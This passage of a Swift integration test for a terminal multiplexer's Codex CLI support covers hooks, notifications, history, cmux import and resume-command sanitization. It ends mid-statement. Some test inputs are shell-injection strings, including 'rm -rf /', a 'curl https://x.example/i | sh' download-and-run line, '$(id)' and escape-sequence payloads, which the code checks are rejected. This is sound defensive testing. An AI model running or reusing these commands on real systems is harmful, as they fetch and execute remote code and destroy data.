import AppKit
import LmuxHooks
import LmuxTerminal
import LmuxSessions
@testable import LmuxUI

// Codex CLI (`--codex`, then `--codex-restore` on the same state dir): a fake `codex` in a pane
// emits real (sanitized) Codex 0.166.0 hook payloads through the real lmux-hook, so the whole
// path is exercised: socket -> state -> ring/badge/notifications -> resume capture -> titles ->
// Copy original -> History (CODEX_HOME is a temp dir, never ~/.codex) -> restore.

enum CodexFixture {
    static let sid = "01a19afa-3664-79f1-b4d9-2fd9b2ca2250"
    static let koID = "0a0a0a0a-0000-4000-8000-0000000000c0"
    static var home: URL { URL(fileURLWithPath: env["CODEX_HOME"] ?? env["LMUX_STATE_DIR"]! + "/codex", isDirectory: true) }
    static var rollout: URL {
        home.appendingPathComponent("sessions/2026/11/02/rollout-2026-11-02T15-37-31-\(sid).jsonl")
    }

    static func payload(_ name: String, _ extra: [String: Any] = [:]) -> String {
        var o: [String: Any] = ["session_id": sid, "turn_id": "01a19afa-368a-7b60-8685-019d8bfac4bf",
                                "transcript_path": rollout.path, "cwd": "/tmp", "hook_event_name": name,
                                "model": "gpt-6-luna", "permission_mode": "default"]
        for (k, v) in extra { o[k] = v }
        return String(decoding: try! JSONSerialization.data(withJSONObject: o, options: [.sortedKeys]), as: UTF8.self)
    }

    /// The rollout as Codex writes it (trimmed), and a closed Korean session for History.
    static let rolloutText = """
    {"timestamp":"2026-11-02T06:37:31.661Z","type":"session_meta","payload":{"id":"\(sid)","cwd":"/tmp","cli_version":"0.166.0","source":"cli"}}
    {"timestamp":"2026-11-02T06:37:33.111Z","type":"event_msg","payload":{"type":"item_completed","turn_id":"01a19afa-368a-7b60-8685-019d8bfac4bf","item":{"type":"UserMessage","content":[{"type":"text","text":"Run `cat note.txt` and reply in markdown: a heading **Result** and the word it printed."}]}}}
    {"timestamp":"2026-11-02T06:37:36.122Z","type":"event_msg","payload":{"type":"item_completed","turn_id":"01a19afa-368a-7b60-8685-019d8bfac4bf","item":{"type":"AgentMessage","content":[{"type":"Text","text":"# Result\\n\\nhello"}],"phase":"final_answer"}}}
    {"timestamp":"2026-11-02T06:37:36.200Z","type":"event_msg","payload":{"type":"task_complete","turn_id":"01a19afa-368a-7b60-8685-019d8bfac4bf","last_agent_message":"# Result\\n\\nhello"}}

    """
    static let koreanText = """
    {"timestamp":"2026-10-01T01:00:00.000Z","type":"session_meta","payload":{"id":"\(koID)","cwd":"/tmp","cli_version":"0.166.0","source":"cli"}}
    {"timestamp":"2026-10-01T01:00:01.000Z","type":"event_msg","payload":{"type":"item_completed","turn_id":"t-1","item":{"type":"UserMessage","content":[{"type":"text","text":"부분환불할 때 금액 검증이 빠져 있어"}]}}}
    {"timestamp":"2026-10-01T01:00:09.000Z","type":"event_msg","payload":{"type":"item_completed","turn_id":"t-1","item":{"type":"AgentMessage","content":[{"type":"Text","text":"검증 로직을 추가했어요."}],"phase":"final_answer"}}}

    """
}

@MainActor
func codexCommandChecks(_ r: Report) {
    r.section = "codex command"
    let id = "01a19afa-3664-79f1-b4d9-2fd9b2ca2250"
    let npm = CodexCommand.resume(argv: ["/opt/node/lib/node_modules/@openai/codex/node_modules/@openai/codex-darwin-arm64/vendor/aarch64-apple-darwin/bin/codex",
                                         "-m", "gpt-6", "--yolo", "-c", "model_reasoning_effort=high", "--search",
                                         "-i", "a.png", "b.png", "fix it"], sessionID: id)
    r.check("npm-installed codex: plain `codex`, session flags kept, prompt and image dropped",
            npm == "codex resume -m gpt-6 --yolo -c model_reasoning_effort=high --search \(id)", npm)
    let node = CodexCommand.resume(argv: ["node", "/usr/local/lib/node_modules/@openai/codex/bin/codex.js", "--sandbox=read-only",
                                          "-a", "never", "--profile", "work", "-C", "/tmp/x y", "--add-dir", "/a"], sessionID: id)
    r.check("node running codex.js (older Node): flags kept, `--x=v` and quoting intact",
            node == "codex resume --sandbox=read-only -a never --profile work -C '/tmp/x y' --add-dir /a \(id)", node)
    // nvm: the bin link node runs for a typed `codex` (argv[1]) resolves into the npm package.
    let nvm = env["LMUX_STATE_DIR"]! + "/nvm"
    try? FileManager.default.createDirectory(atPath: nvm + "/lib/node_modules/@openai/codex/bin", withIntermediateDirectories: true)
    try? FileManager.default.createDirectory(atPath: nvm + "/bin", withIntermediateDirectories: true)
    FileManager.default.createFile(atPath: nvm + "/lib/node_modules/@openai/codex/bin/codex.js", contents: Data())
    try? FileManager.default.createSymbolicLink(atPath: nvm + "/bin/codex", withDestinationPath: "../lib/node_modules/@openai/codex/bin/codex.js")
    let link = CodexCommand.resume(argv: ["node", nvm + "/bin/codex", "-a", "on-request", "do it"], sessionID: id)
    r.check("node running the npm bin link (nvm's …/bin/codex): plain `codex`, flags kept",
            link == "codex resume -a on-request \(id)", link)
    let again = CodexCommand.resume(argv: ["codex", "resume", "--last", "-m", "o4", "old-id", "more prompt"], sessionID: id)
    r.check("a codex that was itself resumed: other selectors and ids dropped", again == "codex resume -m o4 \(id)", again)
    let user = CodexCommand.resume(argv: ["/Users/me/bin/codex", "--worktree", "--dangerously-bypass-approvals-and-sandbox"],
                                   sessionID: id, environment: ["CODEX_HOME": "/Users/me/.codex-work"], inherited: [:])
    r.check("a codex path the user typed is kept; CODEX_HOME becomes an assignment; --worktree is one-shot",
            user == "CODEX_HOME=/Users/me/.codex-work /Users/me/bin/codex resume --dangerously-bypass-approvals-and-sandbox \(id)", user)
    r.check("restore types a saved codex command only when it resumes that session (space-first: out of shell history)",
            LmuxController.resumeCommand(id, saved: "codex resume -m x \(id)", agent: .codex) == " codex resume -m x \(id)\n"
            && LmuxController.resumeCommand(id, saved: "rm -rf / ; codex resume \(id)", agent: .codex) == " codex resume \(id)\n"
            && LmuxController.resumeCommand(id, saved: "codex resume other", agent: .codex) == " codex resume \(id)\n"
            && LmuxController.resumeCommand(id, saved: "X=1 codex resume \(id)", agent: .codex) == " codex resume \(id)\n"
            && LmuxController.resumeCommand(id, saved: "codex resume -m 'a\u{1b}[2J' \(id)", agent: .codex) == " codex resume \(id)\n"
            && LmuxController.resumeCommand("not-a-uuid", saved: "codex resume not-a-uuid", agent: .codex) == nil)
    let crafted = "codex ; curl https://x.example/i | sh ; codex resume \(id)"
    r.check("a crafted saved string (`codex ; curl … | sh ; codex resume <id>`) is never typed as is: plain resume",
            LmuxController.resumeCommand(id, saved: crafted, agent: .codex) == " codex resume \(id)\n"
            && LmuxController.resumeCommand(id, saved: "codex resume -m x$(id) \(id)", agent: .codex) == " codex resume \(id)\n"
            && LmuxController.resumeCommand(id, saved: "codex resume -m 'a;b' \(id)", agent: .codex) == " codex resume -m 'a;b' \(id)\n"
            && LmuxController.resumeCommand(id, saved: "codex resume 'x y' \(id)", agent: .codex) == " codex resume \(id)\n",
            LmuxController.resumeCommand(id, saved: "codex resume -m 'a;b' \(id)", agent: .codex) ?? "nil")
    let cfg = CodexCommand.resume(argv: ["codex", "-c", "model_providers.corp.base_url=https://user:pw@llm.corp",
                                         "-c", "model=o4", "--config=mcp_servers.x.command=\"/bin/sh\"",
                                         "-c", "shell_environment_policy.set.TOKEN=sk-1", "-c", "features.web_search=true",
                                         "--remote", "wss://h:1", "--remote-auth-token-env", "TOK", "-c", "sandbox_mode=read-only"],
                                  sessionID: id)
    r.check("-c keeps only harmless keys (model, sandbox, features…); URLs, MCP servers, shell env, --remote are dropped",
            cfg == "codex resume -c model=o4 -c features.web_search=true -c sandbox_mode=read-only \(id)", cfg)
    let ctl = CodexCommand.resume(argv: ["codex", "-m", "x\u{1b}]0;pwn\u{07}"], sessionID: id)
    r.check("a control character anywhere: only the plain resume", ctl == "codex resume \(id)", ctl)
    r.check("fish-safe quoting of a path with a quote and a backslash",
            CodexCommand.resume(argv: ["codex", "-C", "/tmp/it's\\x"], sessionID: id) == "codex resume -C '/tmp/it'\\''s'\\\\'x' \(id)")
    let roll = "/Users/me/.codex/sessions/2026/11/02/rollout-2026-11-02T15-37-31-\(id).jsonl"
    r.check("transcript paths: a Codex rollout's shape is accepted, nothing else", TranscriptPath.isValid(roll)
            && TranscriptPath.isCodexTranscript(roll) && !TranscriptPath.isClaudeTranscript(roll)
            && !TranscriptPath.isValid("/Users/me/.codex/sessions/2026/11/02/rollout-x.jsonl")
            && !TranscriptPath.isValid("/Users/me/.codex/rollout-2026-11-02T15-37-31-\(id).jsonl")
            && !TranscriptPath.isValid("/Users/me/.codex/sessions/2026/11/../02/rollout-2026-11-02T15-37-31-\(id).jsonl")
            && !TranscriptPath.isValid("/etc/sessions/2026/11/02/passwd"))
}

@MainActor
func runCodex() async -> Int32 {
    let r = Report()
    codexCommandChecks(r)
    let c = makeController()
    let fm = FileManager.default
    let state = URL(fileURLWithPath: env["LMUX_STATE_DIR"]!)
    let home = CodexFixture.home
    r.section = "codex env"
    r.check("CODEX_HOME is a temp dir, never ~/.codex", home.path.hasPrefix(state.deletingLastPathComponent().path)
            && !home.path.hasPrefix(NSHomeDirectory() + "/.codex") && c.history.codexHome.path == home.path, home.path)
    try? fm.createDirectory(at: CodexFixture.rollout.deletingLastPathComponent(), withIntermediateDirectories: true)
    try? CodexFixture.rolloutText.write(to: CodexFixture.rollout, atomically: true, encoding: .utf8)
    let ko = home.appendingPathComponent("sessions/2026/10/01/rollout-2026-10-01T10-00-00-\(CodexFixture.koID).jsonl")
    try? fm.createDirectory(at: ko.deletingLastPathComponent(), withIntermediateDirectories: true)
    try? CodexFixture.koreanText.write(to: ko, atomically: true, encoding: .utf8)
    try? (#"{"id":"\#(CodexFixture.sid)","thread_name":"Read note.txt","updated_at":"2026-11-02T06:37:37Z"}"# + "\n"
          + #"{"id":"\#(CodexFixture.koID)","thread_name":"환불 검증","updated_at":"2026-10-01T01:01:00Z"}"# + "\n")
        .write(to: home.appendingPathComponent("session_index.jsonl"), atomically: true, encoding: .utf8)

    // ------------------------------------------------------------ hooks setup
    r.section = "codex hooks"
    let hookBin = paths.hookBinary ?? "/x/lmux-hook"
    let hooksPath = CodexHooksSetup.hooksPath()
    r.check("hooks.json is under the temp CODEX_HOME", hooksPath == home.appendingPathComponent("hooks.json").path, hooksPath)
    let theirs = "{\n  \"hooks\": {\n    \"Stop\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/x/notify.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n"
    try? theirs.write(toFile: hooksPath, atomically: true, encoding: .utf8)
    do {
        let plan = try CodexHooksSetup.planInstall(hooksPath: hooksPath, hookBinary: hookBin)
        let diff = HooksSetup.diff(plan)
        r.check("the install shows its exact diff: only added lines", diff.contains("+") && !diff.split(separator: "\n").contains {
            $0.hasPrefix("-") && !$0.hasPrefix("---") }, diff)
        try HooksSetup.apply(plan)
        let installedPos = try CodexHookInstaller.positions(String(contentsOfFile: hooksPath, encoding: .utf8))
        r.check("installed: Codex events only, the user's Stop hook keeps position 0",
                CodexHooksSetup.isInstalled() && installedPos.contains("stop:1:0"), "\(installedPos)")
        let model = SettingsModel(controller: c)
        r.check("Settings: Codex found, hooks installed, not trusted yet", model.codexFound && model.codexHooksInstalled
                && model.codexTrust == .needsReview(count: CodexHookInstaller.events.count), "\(model.codexTrust)")
        let pos = try CodexHookInstaller.positions(String(contentsOfFile: hooksPath, encoding: .utf8))
        try pos.map { "[hooks.state.\"\(hooksPath):\($0)\"]\ntrusted_hash = \"sha256:00\"\n" }.joined()
            .write(to: home.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
        model.refreshHooks()
        r.check("…trusted once Codex recorded it (config.toml, only read)", model.codexTrust == .trusted)
        try HooksSetup.apply(try CodexHooksSetup.planUninstall(hooksPath: hooksPath))
        r.check("uninstall restores hooks.json byte for byte", (try? String(contentsOfFile: hooksPath, encoding: .utf8)) == theirs)
        try HooksSetup.apply(try CodexHooksSetup.planInstall(hooksPath: hooksPath, hookBinary: hookBin))
        try? fm.removeItem(at: home.appendingPathComponent("config.toml"))
    } catch {
        r.check("codex hooks install", false, "\(error)")
    }

    // ------------------------------------------------------------ never-fired hint
    r.section = "codex hint"
    let hintWS = c.newWorkspace(select: false)
    let hp = hintWS.panes[0]
    _ = await sinks.waitReady(hp.id)
    c.codexHintDelay = 0.3
    c.noticeCodexStarting(hp, title: "codex --yolo")
    let hinted = await waitFor(3) { hp.view.overlay.toast != nil }
    let hintText = hp.view.overlay.toast?.text.string ?? ""
    r.check("codex started, no Codex hook within the delay, hooks not trusted: one gentle hint in that pane",
            hinted && hintText.contains("Trust all and continue"), hintText)
    c.hideToast(hp)
    c.noticeCodexStarting(hp, title: "codex")
    await sleepMs(500)
    r.check("…once per launch", hp.view.overlay.toast == nil)
    c.closeWorkspace(hintWS)

    // ------------------------------------------------------------ fake codex in a pane
    r.section = "codex state"
    let dir = state.appendingPathComponent("fakecodex", isDirectory: true)
    try? fm.createDirectory(at: dir, withIntermediateDirectories: true)
    let steps: [[(String, [String: Any])]] = [
        [("SessionStart", ["source": "startup"]), ("UserPromptSubmit", ["prompt": "Run `cat note.txt`"]),
         ("PreToolUse", ["tool_name": "Bash", "tool_input": ["command": "cat note.txt"], "tool_use_id": "exec-1"]),
         ("PermissionRequest", ["tool_name": "Bash", "tool_input": ["command": "cat note.txt", "description": "May I read note.txt?"]])],
        [("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "cat note.txt"], "tool_response": "hello\n", "tool_use_id": "exec-1"]),
         ("Stop", ["stop_hook_active": false, "last_assistant_message": "# Result\n\nhello"])],
        [("UserPromptSubmit", ["prompt": "and again"]), ("Interrupt", [:])],
    ]
    var script = "#!/bin/sh\n# fake codex: real payloads through the real lmux-hook, as Codex runs it\n"
    for (i, step) in steps.enumerated() {
        if i > 0 { script += "while [ ! -f '\(dir.path)/go\(i)' ]; do sleep 0.05; done\n" }
        for (j, (name, extra)) in step.enumerated() {
            let f = dir.appendingPathComponent("\(i)-\(j)-\(name).json")
            try? CodexFixture.payload(name, extra).write(to: f, atomically: true, encoding: .utf8)
            script += "'\(hookBin)' codex < '\(f.path)'\n"
        }
    }
    script += "exec sleep 100000\n"
    let fake = dir.appendingPathComponent("codex")
    try? script.write(to: fake, atomically: true, encoding: .utf8)
    chmod(fake.path, 0o755)
    // Flags as a user would start it: the session ones survive into resume, the prompt doesn't.
    let launcher = dir.appendingPathComponent("launch.sh")
    // A job of the pane's shell (its own process group), as when the user types it (the pane's own
    // first process came through setuid login, whose argv macOS doesn't show).
    try? "#!/bin/bash\nset -m\n'\(fake.path)' -m gpt-6-luna -s workspace-write -c 'model_reasoning_effort=\"high\"' -i shot.png 'fix the bug'\n"
        .write(to: launcher, atomically: true, encoding: .utf8)
    chmod(launcher.path, 0o755)
    let posted0 = c.notifier.postedCount
    let ws = c.newWorkspace(select: false, program: launcher.path)
    ws.customTitle = "codex pane"
    let p = ws.panes[0]
    r.check("SessionStart binds the pane to the Codex session (agent: codex)",
            await waitFor(5) { p.claudeSessionID == CodexFixture.sid } && p.agentKind == .codex && p.runsCodex,
            "\(p.claudeSessionID ?? "nil") \(p.agentKind)")
    r.check("PermissionRequest: needs input, “Permission: Bash”", await waitFor(5) { p.needsInput }
            && p.alertDetail == "Permission: Bash", p.alertDetail ?? "nil")
    r.check("…one notification for it, ring + badge on the unfocused pane",
            c.notifier.postedCount == posted0 + 1 && c.notifier.posted.last?.body == "Needs input · Permission: Bash"
            && p.unread == 1 && p.showsRing, "\(c.notifier.posted.suffix(2))")
    r.check("the pane header names Codex", ClaudeProcess.foregroundName(p) == "Codex")
    r.check("resume captured from the codex argv: session flags kept, prompt and image dropped",
            p.resumeCommand == "\(fake.path) resume -m gpt-6-luna -s workspace-write -c 'model_reasoning_effort=\"high\"' \(CodexFixture.sid)",
            p.resumeCommand ?? "nil")
    try? "".write(to: dir.appendingPathComponent("go1"), atomically: true, encoding: .utf8)
    r.check("Stop: done with the last reply", await waitFor(5) { p.display == .done("# Result") }, "\(p.display)")
    r.check("…exactly one more notification", c.notifier.postedCount == posted0 + 2
            && c.notifier.posted.last?.body == "Done · # Result", "\(c.notifier.posted.suffix(2))")

    // Titles: Codex's own thread name (session_index.jsonl), after the Stop debounce.
    r.section = "codex titles"
    r.check("the session title is Codex’s thread_name", await waitFor(5) { p.titleState.title == "Read note.txt" },
            p.titleState.title ?? "nil")
    c.renamePane(p, to: "my name")
    c.scheduleTitleRefresh(p, delay: 0)
    await sleepMs(400)
    r.check("…a name typed in lmux is never overwritten", p.titleState.title == "my name" && p.titleState.isManual)

    // Copy original.
    r.section = "codex copy"
    let md = await c.copyOriginal(p)
    r.check("⌥⌘C copies the last reply as original markdown (Stop’s last_assistant_message)",
            md == "# Result\n\nhello" && c.pasteboard.string(forType: .string) == "# Result\n\nhello", md ?? "nil")
    p.lastReply = nil
    let fromRollout = await c.copyOriginal(p, turnIndex: 1)
    r.check("…and any turn’s reply from the rollout", fromRollout == "# Result\n\nhello", fromRollout ?? "nil")
    r.check("Edit / remove are Claude-only: refused for a Codex pane",
            await c.rewind(p, turnUuid: "01a19afa-368a-7b60-8685-019d8bfac4bf", mode: .remove) == .failed("rewind is Claude Code only"))
    p.hover.turns = await c.loadTurns(p)
    c.requestRewind(p, turnIndex: 1, edit: false)
    r.check("…no confirm card", !c.cardShown(p))
    let bar = TurnActionBar(onCopy: {}, onEdit: {}, onRemove: {})
    bar.editable = false
    r.check("…the hover pill shows ⧉ only (✎ × hidden, one button wide)", bar.edit.isHidden && bar.remove.isHidden
            && bar.size.width == TurnActionBar.buttonSize.width + 4)

    // Interrupt: back to idle, no alert.
    r.section = "codex interrupt"
    let before = c.notifier.postedCount
    try? "".write(to: dir.appendingPathComponent("go2"), atomically: true, encoding: .utf8)
    r.check("Interrupt after a new prompt: idle, no notification, no undo toast",
            await waitFor(5) { p.agent.state == .idle } && c.notifier.postedCount == before && c.pendingUndo == nil,
            "\(p.agent.state)")

    // ------------------------------------------------------------ no notification floods
    // Auto-approved work (approvals bypassed, or a request approved by auto review a moment later)
    // must never notify: only Codex really waiting on the user, and the turn's end.
    r.section = "codex quiet"
    let bypassSID = "0b0b0b0b-0000-4000-8000-0000000000b1"
    func ev(_ name: String, mode: String, _ extra: [String: Any] = [:]) -> String {
        CodexFixture.payload(name, extra.merging(["session_id": bypassSID, "permission_mode": mode]) { $1 })
    }
    var quiet = [ev("SessionStart", mode: "bypassPermissions", ["source": "startup"]),
                 ev("UserPromptSubmit", mode: "bypassPermissions", ["prompt": "refactor everything"])]
    for i in 0..<20 {
        let tool: [String: Any] = ["tool_name": "Bash", "tool_input": ["command": "echo \(i)"], "tool_use_id": "exec-q\(i)"]
        quiet.append(ev("PreToolUse", mode: "bypassPermissions", tool))
        if i == 5 { quiet.append(ev("PermissionRequest", mode: "bypassPermissions", tool)) }
        quiet.append(ev("PostToolUse", mode: "bypassPermissions", tool.merging(["tool_response": "\(i)\n"]) { $1 }))
    }
    // Default approvals, but the request is approved without the user (auto review): the tool runs right after.
    let auto: [String: Any] = ["tool_name": "Bash", "tool_input": ["command": "ls"], "tool_use_id": "exec-auto"]
    quiet += [ev("PreToolUse", mode: "default", auto), ev("PermissionRequest", mode: "default", auto),
              ev("PostToolUse", mode: "default", auto.merging(["tool_response": "a\n"]) { $1 })]
    var qscript = "#!/bin/sh\n"
    for (j, payload) in quiet.enumerated() {
        let f = dir.appendingPathComponent("q-\(j).json")
        try? payload.write(to: f, atomically: true, encoding: .utf8)
        qscript += "'\(hookBin)' codex < '\(f.path)'\n"
    }
    qscript += "touch '\(dir.path)/q-done'\nwhile [ ! -f '\(dir.path)/q-go' ]; do sleep 0.05; done\n"
    let realAsk: [String: Any] = ["tool_name": "Bash", "tool_input": ["command": "rm -rf build"], "tool_use_id": "exec-ask"]
    for (j, payload) in [ev("PreToolUse", mode: "default", realAsk), ev("PermissionRequest", mode: "default", realAsk)].enumerated() {
        let f = dir.appendingPathComponent("q-ask-\(j).json")
        try? payload.write(to: f, atomically: true, encoding: .utf8)
        qscript += "'\(hookBin)' codex < '\(f.path)'\n"
    }
    qscript += "while [ ! -f '\(dir.path)/q-go2' ]; do sleep 0.05; done\n"
    for (j, payload) in [ev("PostToolUse", mode: "default", realAsk.merging(["tool_response": ""]) { $1 }),
                         ev("Stop", mode: "default", ["stop_hook_active": false, "last_assistant_message": "Refactored."])].enumerated() {
        let f = dir.appendingPathComponent("q-end-\(j).json")
        try? payload.write(to: f, atomically: true, encoding: .utf8)
        qscript += "'\(hookBin)' codex < '\(f.path)'\n"
    }
    qscript += "exec sleep 100000\n"
    let qfake = dir.appendingPathComponent("quiet/codex")
    try? fm.createDirectory(at: qfake.deletingLastPathComponent(), withIntermediateDirectories: true)
    try? qscript.write(to: qfake, atomically: true, encoding: .utf8)
    chmod(qfake.path, 0o755)
    let qlaunch = dir.appendingPathComponent("quiet-launch.sh")
    try? "#!/bin/bash\nset -m\n'\(qfake.path)' --yolo\n".write(to: qlaunch, atomically: true, encoding: .utf8)
    chmod(qlaunch.path, 0o755)
    let q0 = c.notifier.postedCount
    let qws = c.newWorkspace(select: false, program: qlaunch.path)
    let qp = qws.panes[0]
    let qDone = await waitFor(15) { fm.fileExists(atPath: dir.appendingPathComponent("q-done").path) }
    await sleepMs(Int(c.codexPermissionGrace * 1000) + 500)
    r.check("\(quiet.count) events of auto-approved work (approvals bypassed, 20 tool calls, a bypassed and an auto-reviewed request): zero notifications",
            qDone && qp.claudeSessionID == bypassSID && c.notifier.postedCount == q0 && qp.agent.state == .running && qp.unread == 0,
            "posted \(c.notifier.postedCount - q0) state \(qp.agent.state)")
    try? "".write(to: dir.appendingPathComponent("q-go"), atomically: true, encoding: .utf8)
    r.check("a request Codex really waits on: exactly one notification", await waitFor(6) { qp.needsInput }
            && c.notifier.postedCount == q0 + 1 && c.notifier.posted.last?.body == "Needs input · Permission: Bash",
            "posted \(c.notifier.postedCount - q0)")
    try? "".write(to: dir.appendingPathComponent("q-go2"), atomically: true, encoding: .utf8)
    r.check("…and the turn’s end in a pane you aren’t looking at: one more", await waitFor(6) { qp.display == .done("Refactored.") }
            && c.notifier.postedCount == q0 + 2, "posted \(c.notifier.postedCount - q0)")
    c.closeWorkspace(qws)

    // ------------------------------------------------------------ Codex's own status (OSC 7501)
    r.section = "codex own status"
    let rdir = dir.appendingPathComponent("report", isDirectory: true)
    try? fm.createDirectory(at: rdir, withIntermediateDirectories: true)
    let rfake = rdir.appendingPathComponent("codex")
    try? "#!/bin/sh\nwhile :; do sleep 1; done\n".write(to: rfake, atomically: true, encoding: .utf8)
    chmod(rfake.path, 0o755)
    let rlaunch = rdir.appendingPathComponent("launch.sh")
    try? "#!/bin/bash\nset -m\n'\(rfake.path)'\n".write(to: rlaunch, atomically: true, encoding: .utf8)
    chmod(rlaunch.path, 0o755)
    func report(_ state: SurfaceView.ProgramStatus.State, _ kind: String? = nil, app: String = "codex") -> SurfaceView.ProgramStatus {
        SurfaceView.ProgramStatus(state: state, kind: kind, app: app)
    }
    let other = c.newWorkspace(select: false)
    let op = other.panes[0]
    _ = await sinks.waitReady(op.id)
    c.programStatus(op, report(.blocked, "permission"))
    r.check("a report from a pane whose foreground program isn't codex: ignored", op.codexReport == nil && !op.needsInput)
    let sws = c.newWorkspace(select: false, program: rlaunch.path)
    let sp = sws.panes[0]
    _ = await waitFor(5) { c.foregroundIsCodex(sp) }
    let r0 = c.notifier.postedCount
    c.programStatus(sp, report(.working))
    c.programStatus(sp, report(.blocked, "permission"))
    r.check("codex in the foreground: working, then its approval dialog: needs you, one notification",
            sp.codexReport == .blocked && sp.needsInput && c.notifier.postedCount == r0 + 1, "\(sp.display)")
    c.userTyped(sp)
    r.check("…arrow keys in that dialog leave it needs you (its own report says when it's answered)", sp.needsInput)
    c.programStatus(sp, report(.blocked, "question"))
    r.check("…a question meanwhile: still one alert, now a question",
            sp.agent.state == .needsInput(.question) && c.notifier.postedCount == r0 + 1, "\(sp.agent.state)")
    c.programStatus(sp, report(.working))
    // A shared server's session starting a turn as this pane's does: its alert waits for the
    // session's hooks, at most the window after it came, also while new sessions keep coming.
    let shared0 = try! HookEvent(paneID: "elsewhere", payload: ["hook_event_name": "UserPromptSubmit", "session_id": "shared-0"])
    c.codexBinder.hold(shared0, at: Date())
    sp.codexTurnStartedAt = Date()
    let heldAt = Date()
    c.saveWork?.cancel()
    c.saveWork = nil
    c.programStatus(sp, report(.done))
    c.programStatus(op, report(.idle))  // (not codex: ignored either way)
    r.check("a done that a waiting session could still bring the reply of: held", sp.codexHeld.count == 1 && sp.agent.state == .running)
    for i in 1...6 {
        await sleepMs(300)
        c.codexBinder.hold(try! HookEvent(paneID: "elsewhere", payload: ["hook_event_name": "UserPromptSubmit", "session_id": "shared-\(i)"]),
                           at: Date())
        sp.codexTurnStartedAt = Date()
    }
    r.check("…released at its deadline anyway, while sessions kept coming", sp.codexHeld.isEmpty && sp.agent.state == .done,
            "\(sp.codexHeld.count) \(sp.agent.state) after \(Date().timeIntervalSince(heldAt))s")
    r.check("…and that done is saved (layout.json: a relaunch shows ✓ again)", c.saveWork != nil)
    c.programStatus(sp, report(.clear, app: ""))
    r.check("Codex's `clear` on quit (no app=): the row is a shell again", sp.codexReport == nil && sp.agent.state == .idle
            && c.actionLog.contains("codex report: pane=\(sp.id.prefix(8)) clear"), "\(String(describing: sp.codexReport))")
    c.programStatus(sp, report(.clear, app: ""))
    c.programStatus(sp, report(.blocked, app: ""))
    r.check("…an app-less report otherwise: ignored", sp.codexReport == nil && !sp.needsInput)

    // A closed pane's token: only for Codex's shared app-server, and only with that pane's id.
    var tapped: [String] = []
    c.hookTap = { tapped.append($0.sessionID ?? "") }
    let srvDir = rdir.appendingPathComponent("srv", isDirectory: true)
    try? fm.createDirectory(at: srvDir, withIntermediateDirectories: true)
    try? "sleep 30\n".write(to: srvDir.appendingPathComponent("app-server"), atomically: true, encoding: .utf8)
    let srv = Process()
    srv.executableURL = URL(fileURLWithPath: "/bin/sh")
    srv.arguments = ["app-server"]
    srv.currentDirectoryURL = srvDir
    try? srv.run()
    c.retiredPaneTokens = [("retired-token", "gone-pane")]
    func retired(_ sid: String, pane: String, pid: Int32) -> HookEvent {
        var e = try! HookEvent(paneID: pane, payload: ["hook_event_name": "UserPromptSubmit", "session_id": sid])
        e.agent = .codex
        e.paneToken = "retired-token"
        e.claudePID = pid
        return e
    }
    await sleepMs(200)
    c.handleSocketHook(retired("from-codex", pane: "gone-pane", pid: getpid()))
    c.handleSocketHook(retired("wrong-pane", pane: sp.id, pid: srv.processIdentifier))
    c.handleSocketHook(retired("from-server", pane: "gone-pane", pid: srv.processIdentifier))
    r.check("a closed pane's token: dropped from anything but Codex's shared server, or naming another pane",
            tapped == ["from-server"] && c.codexBinder.pending["from-server"] != nil, "\(tapped)")
    srv.terminate()
    c.hookTap = nil
    c.closeWorkspace(other)
    c.closeWorkspace(sws)

    // ------------------------------------------------------------ cmux import
    r.section = "codex cmux"
    let cmuxHome = state.appendingPathComponent("cmux-home", isDirectory: true)
    _ = writeCmuxFixture(cmuxHome)
    let src = CmuxSources(home: cmuxHome)
    // A Codex pane as cmux records it: kind "codex", its session id and the launch argv it captured.
    if let d = try? Data(contentsOf: src.session), var o = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
       var wins = o["windows"] as? [[String: Any]], var tm = wins[0]["tabManager"] as? [String: Any],
       var wss = tm["workspaces"] as? [[String: Any]], var panels = wss[2]["panels"] as? [[String: Any]] {
        panels[0]["terminal"] = ["workingDirectory": "/tmp", "agent": [
            "kind": "codex", "sessionId": CodexFixture.koID,
            "launchCommand": ["arguments": ["codex", "--yolo", "-m", "gpt-6", "do it"], "launcher": "codex",
                              "environment": ["CODEX_HOME": "/tmp/cx-home", "OPENAI_API_KEY": "sk-SECRET"]]]]
        wss[2]["panels"] = panels; tm["workspaces"] = wss; wins[0]["tabManager"] = tm; o["windows"] = wins
        try? JSONSerialization.data(withJSONObject: o).write(to: src.session)
    }
    let plan = CmuxImport.plan(src)
    let cx = plan.workspaces.count > 2 ? plan.workspaces[2].root.pane : nil
    r.check("a cmux Codex pane imports as a Codex session: codex resume with its flags, CODEX_HOME, no secret",
            cx?.agent == "codex" && cx?.claudeSession == CodexFixture.koID
            && cx?.resumeCommand == "codex resume --yolo -m gpt-6 \(CodexFixture.koID)"
            && cx?.resumeEnvironment == ["CODEX_HOME": "/tmp/cx-home"], "\(String(describing: cx))")
    r.check("…and the summary says so", plan.summary[.workspaces]?.first?.contains("1 Codex session resumes") == true,
            "\(plan.summary[.workspaces] ?? [])")

    // ------------------------------------------------------------ History
    r.section = "codex history"
    await c.history.refresh()
    let codexRows = c.history.sessions.filter { $0.agent == .codex }
    r.check("Codex sessions are indexed with their titles and marked as Codex", Set(codexRows.map(\.id)) == [CodexFixture.sid, CodexFixture.koID]
            && codexRows.first { $0.id == CodexFixture.koID }?.title == "환불 검증", "\(codexRows.map { ($0.id, $0.title ?? "-") })")
    r.check("…the open one isn’t listed (it’s a workspace)", !c.history.items.contains { $0.record.id == CodexFixture.sid })
    await c.history.search("환불")
    r.check("Korean search finds the Codex session, marked Codex",
            c.history.items.contains { $0.record.id == CodexFixture.koID && $0.record.agent == .codex },
            "\(c.history.items.map(\.record.id))")
    var resumed: Workspace?
    await withCheckedContinuation { (k: CheckedContinuation<Void, Never>) in
        c.history.resume(CodexFixture.koID) { w in resumed = w; k.resume() }
    }
    let rp = resumed?.panes.first
    r.check("Resume opens a workspace running codex resume <id>",
            await sinks.wait(rp?.id ?? "", contains: "codex resume \(CodexFixture.koID)", timeout: 5), sinks.text(rp?.id ?? ""))
    c.history.query = ""

    // ------------------------------------------------------------ for the restore run
    c.saveNow()
    let layout = c.snapshotLayout()
    let saved = layout.workspaces.flatMap { w -> [LayoutFile.PaneState] in
